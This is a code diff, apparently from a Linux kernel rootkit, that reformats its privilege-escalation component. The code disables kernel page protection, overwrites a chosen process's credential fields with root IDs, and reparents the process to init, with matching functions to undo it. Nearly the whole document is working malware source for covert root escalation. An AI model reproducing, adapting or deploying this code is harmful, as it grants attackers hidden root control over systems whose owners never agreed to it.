@@ -36,28 +36,25 @@ struct data_node *creds = NULL;
  * source: https://www.kernel.org/doc/Documentation/security/credentials.txt
  */
 
-void init_task_adopt(struct task_struct *task, struct cred_node *node) {
-
-	/*
-	 * explanation and code adopted from www.informit.com, especially
-	 * from the paragraph "The Dilemma of the Parentless Task"
-	 *
-	 * http://www.informit.com/articles/article.aspx?p=368650&seqNum=4
-	 */
+/*
+ * explanation and code adopted from www.informit.com, especially
+ * from the paragraph "The Dilemma of the Parentless Task"
+ *
+ * http://www.informit.com/articles/article.aspx?p=368650&seqNum=4
+ */
+void init_task_adopt(struct task_struct *task, struct cred_node *node)
+{
 	node->parent = task->parent;
 	node->real_parent = task->real_parent;
 
-	/* write lock */
 	write_lock_irqsave(&cred_lock, cred_flags);
 
 	/* real_parent is now the init task */
 	task->real_parent = real_init;
 
 	/* adopting from kernel/exit.c */
-	if(!task->ptrace) {
-
+	if(!task->ptrace)
 		task->parent = real_init;
-	}
 
 	/*
 	 * current task was adopted by init, so he has new siblings
@@ -65,14 +62,11 @@ void init_task_adopt(struct task_struct *task, struct cred_node *node) {
 	 * insert it to the init childrens siblings list
 	 */
 	list_move(&task->sibling, real_init->children.next);
-
-	/* write unlock */
 	write_unlock_irqrestore(&cred_lock, cred_flags);
 }
 
-void init_task_disown(struct cred_node *node) {
-
-	/* write lock */
+void init_task_disown(struct cred_node *node)
+{
 	write_lock_irqsave(&cred_lock, cred_flags);
 
 	/* reversion of init_task_adopt */
@@ -80,17 +74,16 @@ void init_task_disown(struct cred_node *node) {
 	node->task->real_parent = node->real_parent;
 
 	list_move(&node->task->sibling, node->parent->children.next);
-
-	/* write unlock */
 	write_unlock_irqrestore(&cred_lock, cred_flags);
 }
 
-void insert_cred(struct task_struct *task) {
-
+void insert_cred(struct task_struct *task)
+{
 	struct cred *pcred;
 
 	/* create new node */
-	struct cred_node *cnode = kmalloc(sizeof(struct cred_node), GFP_KERNEL);
+	struct cred_node *cnode = kmalloc(sizeof(struct cred_node), 
+		GFP_KERNEL);
 
 	debug("INSERT PROCESS %d CREDENTIALS", task->pid);
 
@@ -98,8 +91,6 @@ void insert_cred(struct task_struct *task) {
 	cnode->task = task;
 
 	disable_page_protection();
-
-	/* reading from tasks */
 	rcu_read_lock();
 
 	/* get process creds */
@@ -116,35 +107,31 @@ void insert_cred(struct task_struct *task) {
 	cnode->fsgid = pcred->fsgid;
 
 	/* escalate to root */
-	pcred->uid.val = pcred->euid.val = pcred->suid.val = pcred->fsuid.val = 0;
-	pcred->gid.val = pcred->egid.val = pcred->sgid.val = pcred->fsgid.val = 0;
+	pcred->uid.val = pcred->euid.val = 0;
+	pcred->suid.val = pcred->fsuid.val = 0;
+	pcred->gid.val = pcred->egid.val = 0;
+	pcred->sgid.val = pcred->fsgid.val = 0;
 
 	/* make process adopted by init */
 	init_task_adopt(task, cnode);
 
 	/* finished reading */
 	rcu_read_unlock();
-
 	enable_page_protection();
 
 	debug("INSERT CREDENTIALS IN LIST");
-
-	/* insert in list */
 	insert_data_node(&creds, (void *)cnode);
 }
 
-void remove_cred(struct data_node *node) {
-
+void remove_cred(struct data_node *node)
+{
 	struct cred *pcred;
 
 	/* get node */
 	struct cred_node *cnode = (struct cred_node *)node->data;
 
 	debug("REMOVE CREDENTIALS FROM PROCESS %d", cnode->pid);
-
 	disable_page_protection();
-
-	/* reading from tasks */
 	rcu_read_lock();
 
 	pcred = (struct cred *)cnode->task->cred;
@@ -164,63 +151,51 @@ void remove_cred(struct data_node *node) {
 
 	/* finished reading */
 	rcu_read_unlock();
-
 	enable_page_protection();
-
 	debug("CLEAR CREDENTIAL NODE");
-
 	kfree(cnode);
 }
 
-void process_escalate(int pid) {
-
+void process_escalate(int pid)
+{
 	struct task_struct *task = pid_task(find_get_pid(pid), PIDTYPE_PID);
 
-	if(find_data_node_field(&creds, (void *)&pid, offsetof(struct cred_node, pid), sizeof(pid)) == NULL && task != NULL) {
-
+	if(find_data_node_field(&creds, (void *)&pid, 
+		offsetof(struct cred_node, pid), sizeof(pid)) == NULL 
+		&& task != NULL) {
 		debug("PROCESS %d NOT IN LIST, INSERT NEW CREDENTIAL", pid);
-
 		insert_cred(task);
-
 		return;
 	}
 
 	debug("PROCESS %d ALREADY IN LIST OR TASK NOT FOUND", pid);
 }
 
-void process_deescalate(int pid) {
-
-	struct data_node *node = find_data_node_field(&creds, (void *)&pid, offsetof(struct cred_node, pid), sizeof(pid));
+void process_deescalate(int pid)
+{
+	struct data_node *node = find_data_node_field(&creds, (void *)&pid, 
+		offsetof(struct cred_node, pid), sizeof(pid));
 
 	if(node != NULL) {
-
 		debug("PROCESS %d IN LIST, DELETE CREDENTIALS", pid);
-
 		remove_cred(node);
-
 		delete_data_node(&creds, node);
-
 		return;
 	}
 
 	debug("PROCESS %d NOT IN LIST", pid);
 }
 
-int priv_escalation_init(void) {
-
+int priv_escalation_init(void)
+{
 	debug("INITIALIZE PRIVILEGE EXCALATION");
-
 	real_init = pid_task(find_get_pid(1), PIDTYPE_PID);
-
-	/* nothing for now */
 	return 0;
 }
 
-void priv_escalation_exit(void) {
-
+void priv_escalation_exit(void)
+{
 	debug("EXIT PRIVILEGE ESCALATION");
-
-	/* reset creds for every task */
 	free_data_node_list_callback(&creds, remove_cred);
 }
 
